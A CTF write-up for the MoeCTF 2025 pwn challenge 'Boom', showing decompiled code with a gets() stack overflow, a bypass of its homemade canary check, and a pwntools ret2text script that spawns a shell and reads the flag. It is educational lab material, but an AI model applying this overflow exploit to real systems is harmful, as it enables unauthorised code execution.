---
title: 'XiDianCTF MoeCTF 2025 PWN Boom'
date: '2026-09-04T11:33:13+08:00'
lastmod: '2026-09-04T11:33:13+08:00'
summary: ""
hideSummary: true
draft: false
author: "QingKong996"
categories:
  - "CTF"
tags:
  - "CTF"
  - "PWN"
---

```
The original Chinese article was written by a human and only proofread with generative AI. This English version was translated with AI.
```

[Challenge link](https://ctf.xidian.edu.cn/training/22?challenge=964)

As usual, open the binary in IDA.

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s[124]; // [rsp+0h] [rbp-90h] BYREF
  int v5; // [rsp+7Ch] [rbp-14h]
  int v6; // [rsp+8Ch] [rbp-4h]

  init(argc, argv, envp);
  puts("Welcome to Secret Message Book!");
  puts("Do you want to brute-force this system? (y/n)");
  fgets(&brute_choice, 8, stdin);
  v6 = 0;
  if ( brute_choice == 121 || brute_choice == 89 )
  {
    v6 = 1;
    canary = (int)random() % 114514;
    v5 = canary;
    puts("waiting...");
    sleep(1u);
    puts("boom!");
    puts("Brute-force mode enabled! Security on.");
  }
  else
  {
    puts("Normal mode. No overflow allowed.");
  }
  printf("Enter your message: ");
  if ( v6 )
    gets(s);
  else
    fgets(s, 128, stdin);
  if ( v6 && v5 != canary )
  {
    puts("Security check failed!");
    exit(1);
  }
  puts("Message received.");
  return 0;
}
```

If we choose `n`, we can overflow by only four additional bytes, which is clearly insufficient.

Therefore, we have to choose `y`.

We cannot read the canary stored in `v5`, but the final security check is bypassed whenever `v6` is 0. We only need to overwrite `v6` with 0 and then perform a ret2text attack.

Using the offsets shown by IDA, the saved return address is `0x90 + 0x8 = 0x98`, or 152 bytes, above `s` on the stack.

For convenience, there is no need to calculate the offset of `v6` separately; simply fill the entire region with zero bytes.

```c
ext:0000000000401276 ; int win()
.text:0000000000401276                 public win
.text:0000000000401276 win             proc near
.text:0000000000401276 ; __unwind {
.text:0000000000401276                 endbr64
.text:000000000040127A                 push    rbp
.text:000000000040127B                 mov     rbp, rsp
.text:000000000040127E                 lea     rax, command    ; "/bin/sh"
.text:0000000000401285                 mov     rdi, rax        ; command
.text:0000000000401288                 call    _system
.text:000000000040128D                 nop
.text:000000000040128E                 pop     rbp
.text:000000000040128F                 retn
.text:000000000040128F ; } // starts at 401276
.text:000000000040128F win             endp
```

The target address is `0x40127E`.

Pwntools script:

```python
from pwn import *
context(arch='amd64', os='linux', log_level='error')

io = connect("127.0.0.1", 10626)

io.sendline(b'y')


io.send(b'\x00' * 152 + p64(0x40127E))


io.interactive()
```

Output:

```
Welcome to Secret Message Book!
Do you want to brute-force this system? (y/n)
waiting...
boom!
Brute-force mode enabled! Security on.
Enter your message:
Message received.
>> ls 
bin
flag
lib
lib32
lib64
libexec
libx32
pwn
>> cat flag
moectf{THIS_IS_FLAG}
```





